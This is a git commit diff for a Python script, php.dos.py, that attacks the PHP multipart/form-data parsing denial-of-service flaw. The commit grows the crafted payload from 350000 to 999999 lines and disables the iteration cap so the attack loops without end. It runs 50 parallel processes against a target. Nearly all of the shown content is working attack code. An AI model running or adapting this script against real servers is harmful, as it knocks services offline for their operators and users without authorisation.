2c5815ff82ab1a0f2ec6b995c7784ca66ab75e84
zhijie <zhijie@mogujie.com>
2015-05-22 11:50:44 +0800

    Improves

--- php.dos.py
+++ php.dos.py
@@ -11,30 +11,30 @@ def check_php_multipartform_dos(url, post_body, headers):
     for key in headers.keys():
         req.add_header(key, headers[key])
     start_time = datetime.datetime.now()
-    fd = urllib2.urlopen(req, post_body)
-    print fd.getcode()
+    try:
+        fd = urllib2.urlopen(req, post_body)
+        code = fd.getcode()
+    except Exception as e:
+        code = 'ERROR'
+        print e
     end_time = datetime.datetime.now()
     use_time = (end_time - start_time).seconds
     result = ''
     if use_time > 5:
-        result = url + " is vulnerable"
+        result = "Vulnerable"
     else:
         if use_time > 3:
             result = "need to check normal respond time"
-    return [result, use_time]
+    return [result, use_time, code]
 
 
-# end
-
-# worker function
 def worker():
-    x = 0
+    # x = 0
     while True:
-        if x > 1000:
-            exit(0)
-        print x
+        # if x > 1000:
+        #     exit(0)
         attack()
-        x += 1
+        # x += 1
 
 
 def attack():
@@ -50,26 +50,24 @@ def attack():
     else:
         return
 
-    count = 350000
+    count = 999999
     headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
                'Accept-Encoding': 'gzip, deflate',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
     body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
     payload = ""
-    for x in range(count):
+    for n in range(count):
         payload += "a\n"
     body += payload
     body += "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
-    print "starting..."
+    print "START"
     respond = check_php_multipartform_dos(target, body, headers)
-    print "Result : "
-    print respond[0]
-    print "Respond time : " + str(respond[1]) + " seconds"
+    print respond[0] + " : " + str(respond[1]) + "s : STATUS : " + str(respond[2])
 
 
 if __name__ == "__main__":
     jobs = []
-    for i in range(50):
-        p = multiprocessing.Process(target=worker)
-        jobs.append(p)
-        p.start()
+    for p in range(50):
+        pro = multiprocessing.Process(target=worker)
+        jobs.append(pro)
+        pro.start()
